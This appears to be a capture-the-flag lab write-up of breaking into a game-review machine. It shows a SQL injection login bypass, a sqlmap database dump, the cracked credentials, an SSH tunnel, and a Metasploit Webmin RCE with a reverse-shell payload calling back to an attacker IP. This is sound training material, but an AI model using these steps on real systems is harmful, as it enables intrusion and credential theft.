@@ -1,0 +1,82 @@
+fun room 
+
+done it quick, less than an hour 
+
+1: enumeration 
+
+address presents a basic, semi functional game review site with a login panel and nothing more, source didnt show anything interesting, nikto didn’t show anything interesting, nmap with default scripts didnt show anything interesting, gobuster returned a portal.php which was crucial in exploiting the machine 
+
+2: exploiting 
+
+Defeating the login pane (wasn’t necessary) with: 
+
+`‘ or 1=1 ;—`
+
+in both username and password fields forwarded us to portal.php:
+
+site contained a search pane, turned out it was prone to SQLi with:
+
+`‘`
+
+which returned a mysql error 
+
+to defeat it, it was necessary to capute and copy the search request using burp, and providing sqlmap with it: `sqlmap -r request.txt —dbms=mysql —dump`
+
+this dumped two tables, one with game names and reviews, the other with a hash and an username
+
+hash was sha256, cracked it with john using rockyou.txt, username was inside the table
+
+**agent47:videogamer124**
+
+with those credentials, we were able to log into SSH, which gave us the first flag
+
+# REVERSE SSH TUNNELS:
+
+![https://i.imgur.com/cYZsC8p.png](https://i.imgur.com/cYZsC8p.png)
+
+Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.
+
+- **L** is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do **ssh -L 9000:imgur.com:80 user@example.com.** Going to localhost:9000 on your machine, will load imgur traffic using your other server.
+- **R** is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.
+
+`ss -tulnp` showed us sockets running on the host,
+
+running 
+
+**`ssh -L 10000:localhost:10000 agent47@MACHINEIP`**
+
+on attacker machine
+
+allowed us to catch the reverse ssh tunnel, which revealed a CMS (content management system) called Webmin 1.580, and surprisingly this version was vulnerable to a RCE with the exploit being preinstalled in metasploit
+
+metasploit path:
+
+`search webmin`
+
+`use exploit/unix/webapp/webmin_show_cgi_exec`
+
+`show payloads`
+
+`set payload cmd/unix/reverse_python`
+
+`set password videogamer124`
+
+`set username agent47`
+
+`set rhosts [localhost](http://localhost)` 
+
+`set rport 10000`
+
+`set ssl false`
+
+`set lhost 10.9.6.40`
+
+`set lport 4444`
+
+`exploit`
+
+this provided us with a root shell 
+
+grab root flag located at /root, and thats it 
+
+:)
